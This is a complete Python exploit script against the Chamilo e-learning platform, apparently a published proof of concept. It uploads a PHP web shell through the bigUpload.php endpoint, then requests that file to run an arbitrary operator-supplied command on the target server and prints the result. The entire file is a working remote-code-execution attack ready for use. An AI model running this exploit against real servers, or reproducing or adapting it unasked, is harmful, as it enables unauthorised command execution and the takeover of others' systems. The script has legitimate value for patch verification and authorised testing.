from argparse import ArgumentParser
from requests import get, post

vulnerable_endpoint = '/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
upload_directory    = '/main/inc/lib/javascript/bigupload/files/'
webshell_name       = 'b1tc0r3_rce.php'

def parse_args():
    parser = ArgumentParser(
        prog = 'python exploit.py',
        epilog = 'Copyright Â© 2023 Thomas Gingele https://github.com/B1TC0R3'
    )

    parser.add_argument(
        '-u',
        '--url',
        help = 'Target URL. This needs to point to the root of the Chamilo application',
    )

    parser.add_argument(
        '-c',
        '--command',
        help = 'The command that will be executed.',
    )

    return parser.parse_args()


def check_status_code(status_code):
    if status_code not in range(200, 299):
        print('[!] Target does not seem to be exploitable. Aborting.')
        exit(1)


def execute_command(url, command):
    payload = f'<?php system("{command}"); ?>'

    response = post(
        url + vulnerable_endpoint,
        files = {
            'bigUploadFile': (
                webshell_name,
                payload
            )
        }
    )

    check_status_code(response.status_code)
    response = get(url + upload_directory + webshell_name)
    print(response.text)


def main():
    args = parse_args()

    response = get(args.url + upload_directory)
    check_status_code(response.status_code)

    execute_command(args.url, args.command)


if __name__ == '__main__':
    main()

else:
    raise Exception('File is not intended for use with \'import\'.') 
